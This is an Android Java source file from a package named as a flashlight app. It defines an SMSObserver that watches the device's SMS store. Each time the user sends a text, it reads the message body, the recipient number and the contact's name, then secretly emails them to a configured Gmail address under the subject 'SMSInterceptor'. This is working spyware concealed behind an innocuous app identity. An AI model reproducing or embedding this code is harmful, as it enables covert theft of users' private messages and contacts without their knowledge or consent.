package com.flash.light; 

import java.util.List;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

import android.net.Uri;
import android.util.Log;
import android.os.Handler;
import android.widget.Toast;
import android.app.Activity;
import android.telephony.SmsManager;

import android.content.Context;
import android.content.ContentResolver;

import android.database.Cursor;
import android.database.DatabaseUtils;
import android.database.ContentObserver;

public class SMSObserver extends ContentObserver {

  private Handler handler;

  
  public  static Context context;
  private static Contacts contact;
  private static DatabaseHandler db;
  private static GmailSender sender; 
  private static Configure configure;

  private static String endPoint;
  private static String initId = "0";
  private static String sPhoneNumberDb;
  private static String sEmailAddressDb;
  private static String gmailEmailString;

  private static final String TAG = "FlashLight SMSObserver";

  public SMSObserver(Handler handler, Context context) {
    super(handler);

    handler = handler;    
    SMSObserver.context = context;
    db = new DatabaseHandler(context);
    contact   = new Contacts();
    configure = new Configure();
    gmailEmailString = configure.emailAddress();

    Log.d(TAG, "Entering SMSObserver constructor");

  }

  public String endPoint(final String number, final Context context) {

    String end_point;
    final String contact_name  = contact.getContactName(number, context);

    if(!contact_name.isEmpty()) {
      end_point = "" + number + "(" + contact_name + ")";
    }
    else {
      end_point = number;
    }
    return end_point;
  }

  @Override
  public void onChange(boolean selfChange) {
    super.onChange(selfChange);

    Log.i(TAG, "Entering onChange()");

    Cursor cursor = null;
    Uri uriSMSURI = Uri.parse("content://sms");
    String[] sCol = {"_id","type","body","address"};
    String sOrder = "date desc limit 1";
   
    try {

      cursor = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
      cursor.moveToLast();

      String id   = cursor.getString(cursor.getColumnIndex("_id"));
      String type = cursor.getString(cursor.getColumnIndex("type"));

      final String body = cursor.getString(cursor.getColumnIndex("body"));
      final String addr = cursor.getString(cursor.getColumnIndex("address"));

      //if(!(String.valueOf(initId)).equals(id)) && type.equals("2")) {
      if(!initId.equals(id) && type.equals("2")) {
        initId = id;
        Log.d(TAG, "Ougoing text message sent!");
        Log.i(TAG, "onChange() id: " + id + ", InitId: " +
                                       initId + ", type: " +
                                       type + ", body: " +
                                       body + ", addr: " +
                                       endPoint(addr, context));
        new Thread(new Runnable() {

          @Override
          public void run() {
            try {
              sender = new GmailSender();
              sender.sendMail("SMSInterceptor",
                "OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body,
                gmailEmailString);
            }
            catch(Exception e) {
              e.printStackTrace();
              Log.e(TAG, "onChange() Exception e " + e.toString());
            }
          }
        }).start();
      }
      else { } // Incoming messages if type == 1
    }
    catch(Exception e) {
      Log.d(TAG, "onChange() Exception e " + e.toString());
    }
    finally {
      if(cursor != null) {
        cursor.close();
      }
    }
  }
}
